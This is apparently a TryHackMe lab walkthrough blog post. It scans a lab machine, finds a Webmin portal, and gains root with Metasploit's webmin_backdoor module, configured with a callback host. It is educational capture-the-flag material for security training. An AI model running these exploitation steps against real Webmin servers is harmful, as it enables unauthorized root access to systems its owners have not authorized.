---
layout: post
title: "Attacker KB"
date: 2022-10-21
categories: [Tryhackme, Easy-THM]
tags: [rustscan, /etc/hosts, Webmin, AttackerKB]
image: ../../assets/img/posts/attackerkb.png 

---

## Description

Learn how to leverage AttackerKB and learn about exploits in your workflow!

|**Room**|[Attacker KB](https://tryhackme.com/room/attackerkb)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[DarkStar7471](https://tryhackme.com/p/DarkStar7471)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.125.186 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187246492-45b8db6d-5160-44cb-b308-d98727ef0202.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p22,10000 10.10.125.186 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187246557-c85308a1-4d62-496d-9048-bd91903c2529.png)

Result scan shows that port 22 is running ssh service and port 10000 is running webserver.

Let's start with enumerating port 10000 by visiting http://10.10.125.186,

![image](https://user-images.githubusercontent.com/67465230/187246611-25b1aae2-6324-4b9a-8b37-bbba5d8b4fb6.png)

We got the error on the page as it doesn't load on browser because this webserver is running ssl mode and we are following the IP on web as http. Even after clicking on the link provided on the webpage, we will still get the error.

Let's visit this webpage by https://10.10.125.186:10000,

![image](https://user-images.githubusercontent.com/67465230/187246681-c863e091-9bf7-4b46-a6a9-e970ca9be87c.png)

we got a webmin login portal. We can try to login into this portal using default credentials.

Now, let's check the certificate  of the webpage and there we will get the hostname, *source*

![image](https://user-images.githubusercontent.com/67465230/187246728-da84bb50-673e-4ce9-be89-acadbd0785b5.png)

Now, we can add this hostname with our host machine IP in our /etc/hosts file,

```bash
10.10.125.186    source.thm
```

![image](https://user-images.githubusercontent.com/67465230/187246769-afe4236b-9b0b-4389-ae1c-2fde4d71f00b.png)

Now, visit https://source.thm

![image](https://user-images.githubusercontent.com/67465230/187246848-89705086-faa2-4172-9536-96569d64c4af.png)

We got the webmin login portal.

Now, let's check this vulnerability on [AttackerKb](https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search)

![image](https://user-images.githubusercontent.com/67465230/187247004-8dd2bc94-3284-4591-a62e-1c17585a2df4.png)

AttackerKB is another kind of database which has many exploits and CVEs just like exploitdb.

Now start metasploit and we will be using webmin_backdoor,

```bash
msfconsole -q
search webmin
use exploit/linux/http/webmin_backdoor
options
```

![image](https://user-images.githubusercontent.com/67465230/187247050-9ddedffd-07ae-4290-8f33-4f96b89a433a.png)

setting `options`:
- **set rhosts 10.10.125.186**
- **set lhost tun0**
- **set ssl true**

Running the module and we will get the root access,

![image](https://user-images.githubusercontent.com/67465230/187247084-5a81a3b3-ee7e-4010-92ad-e18dece89da9.png)
